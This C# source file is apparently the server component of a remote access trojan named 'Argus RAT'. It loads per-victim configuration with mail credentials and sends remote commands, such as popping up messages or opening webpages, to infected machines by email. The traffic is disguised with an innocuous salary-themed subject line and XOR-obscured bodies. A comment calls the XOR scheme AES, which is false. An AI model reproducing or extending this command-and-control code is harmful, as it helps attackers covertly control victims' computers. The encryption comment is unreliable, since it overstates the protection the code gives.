using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Windows.Forms;
using System.Net.Mail;

namespace Argus___RAT___Server
{
    class Commands
    {
        Globals glob = new Globals();

        public bool IsReady = false;

        public Commands(String Client)
        {
            if (!ChangeClient(Client))
            {
                // throw new Exception("Could not intialize class due to given errors!");
            }
        }

        /// <summary>
        /// Changes the current Client
        /// </summary>
        /// <param name="Client">Name of the new Client</param>
        /// <returns>If Error occured -> False</returns>
        public bool ChangeClient(String Client)
        {
            String line;

            try
            {
                // Read Client's file line by line
                StreamReader file = new StreamReader(@"Clients\" + Client + ".txt");
                while ((line = file.ReadLine()) != null)
                {
                    if (!SetGlobalValue(line))
                        return false;
                }

                file.Close();

                // Tell other programs that we're ready
                IsReady = true;

                return true;
            }
            
            catch (FileNotFoundException ex)
            {
                MessageBox.Show("An error occured while reading Client's text file: File Not Found!", "Error in Client's Text File");
                return false;
            }
        }

        /// <summary>
        /// Sets the global values
        /// </summary>
        /// <param name="line">The line to parse</param>
        /// <returns>If Error occured -> False</returns>
        private bool SetGlobalValue(String line)
        {
            int pos = line.IndexOf(':');
            if (pos == -1)
            {
                MessageBox.Show("An error occured while reading Client's text file: Invalid line format!", "Error in Client's Text File");
                return false;
            }
            String name = line.Substring(0, pos).ToLower();
            String value = line.Substring(pos + 1, line.Length - pos - 1);

            switch (name)
            {
                // Removed; should read the Connection details too, but I thought one connection way for all Clients is better.

                /*
                case "mailserverpopaddress":
                    glob.MailServerPopAddress = value;
                    break;
                case "mailserversmtpaddress":
                    glob.MailServerSmtpAddress = value;
                    break;
                case "mailserversmtpport":
                    try
                    {
                        glob.MailServerSmtpPort = int.Parse(value);
                        break;
                    }
                    catch
                    {
                        MessageBox.Show("An error occured while reading Client's text file: Expected an integer value!", "Error in Client's Text File");
                        return false;
                    }
                case "mailserverpopport":
                    try
                    {
                        glob.MailServerPopPort = int.Parse(value);
                        break;
                    }
                    catch
                    {
                        MessageBox.Show("An error occured while reading Client's text file: Expected an integer value!", "Error in Client's Text File");
                        return false;
                    }
                */

                case "clientmailaddress":
                    glob.ClientMailAddress = value;
                    break;
                case "servermailaddress":
                    glob.ServerMailAddress = value;
                    break;
                case "servermailpass":
                    glob.ServerMailPass = value;
                    break;
                case "encryptionkey":
                    glob.XorKey = value;
                    break;
                default:
                    MessageBox.Show("Invalid variable name: " + name, "Invalid Variable Name");
                    break;
            }

            return true;
        }

        /* * * * * * * * * * * * * * * * * * * *\
         *                                     *
         *               Commands              *
         *                                     *
        \* * * * * * * * * * * * * * * * * * * */

        /// <summary>
        /// Sends a Toast to Client
        /// </summary>
        /// <param name="text">The Toast to show</param>
        public bool SendToast(String text)
        {
            String body = "Toast:" + text;
            return SendMail(body);
        }

        /// <summary>
        /// Sends a webpage to Client
        /// </summary>
        /// <param name="page">The page to get opened</param>
        public bool OpenWebpage(String page)
        {
            String body = "Website:" + page;
            return SendMail(body);
        }

        /* * * * * * * * * * * * * * * * * * * *\
         *                                     *
         *            Send & Receive           *
         *                                     *
        \* * * * * * * * * * * * * * * * * * * */

        /// <summary>
        /// Sends a Mail with the given text
        /// </summary>
        private bool SendMail(String Body)
        {
            using (SmtpClient smtp = new SmtpClient(glob.MailServerSmtpAddress))
            {
                MailAddress from = new MailAddress(glob.ServerMailAddress);
                MailAddress to = new MailAddress(glob.ClientMailAddress);

                MailMessage message = new MailMessage(from, to);

                message.Subject = "What's about my salary increase?";
                message.Body = EncryptMail(Body);

                smtp.Credentials = new System.Net.NetworkCredential(glob.ServerMailAddress, glob.ServerMailPass);
                smtp.EnableSsl = true;

                try
                {
                    smtp.Send(message);
                }
                catch
                {
                    MessageBox.Show("The message couldn't be sent due to errors! Maybe wrong credentials or your internet connection is down?", "Error while sending Message");
                    return false;
                }
            }

            return true;
        }

        /// <summary>
        /// Encrypts the given text with the AES Key
        /// </summary>
        /// <param name="text">The plain text</param>
        /// <returns>The encrypted String</returns>
        private String EncryptMail(String text)
        {
            if (text == null)
                return "";

            byte[] key = Encoding.UTF8.GetBytes(glob.XorKey);
            byte[] EncryptedText = Encoding.UTF8.GetBytes(text);
            for (int i = 0; i < EncryptedText.Length; i++)
            {
                EncryptedText[i] ^= key[i % key.Length];
            }
            

            return Convert.ToBase64String(EncryptedText);
        }
    }
}
